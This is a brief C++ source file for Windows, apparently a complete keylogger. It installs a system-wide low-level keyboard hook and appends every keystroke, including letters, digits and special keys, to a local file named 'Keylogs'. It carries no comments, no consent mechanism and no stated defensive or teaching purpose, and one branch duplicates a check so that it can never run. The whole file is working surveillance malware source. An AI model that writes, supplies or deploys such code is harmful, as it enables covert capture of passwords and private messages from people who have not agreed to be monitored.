#include <iostream>
#include<fstream>
#include<windows.h>


using namespace std;

void logKeystroke(int key) {
    ofstream logfile;
    logfile.open("Keylogs", std::ios::app);

    if (key == VK_BACK)
        logfile << "[BACKSPACE]";
    else if (key == VK_RETURN)
        logfile << "[ENTER]";
    else if (key == VK_RETURN)
        logfile << "[RETURN]";
    else if (key == VK_TAB)
        logfile << "[TAB]";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        logfile << "[CTRL]";
    else if (key == VK_ESCAPE)
        logfile << "[ESC]";
    else if (key == VK_OEM_PERIOD)
        logfile << ".";
    else if (key >= 'A' && key <= 'Z')
        logfile << char(key);
    else if (key >= '0' && key <= '9')
        logfile << char(key);
    else
        logfile << "[" << key << "]";

    logfile.close();

}

LRESULT CALLBACK keyboardProc(int ncode, WPARAM wParam, LPARAM LParam) {
    
    if (ncode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pkeyboard = (KBDLLHOOKSTRUCT*)LParam;
        int key = pkeyboard->vkCode;
            logKeystroke(key);
    }
    return CallNextHookEx(NULL, ncode, wParam, LParam);
}

int main() {

    HHOOK keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardhook);
}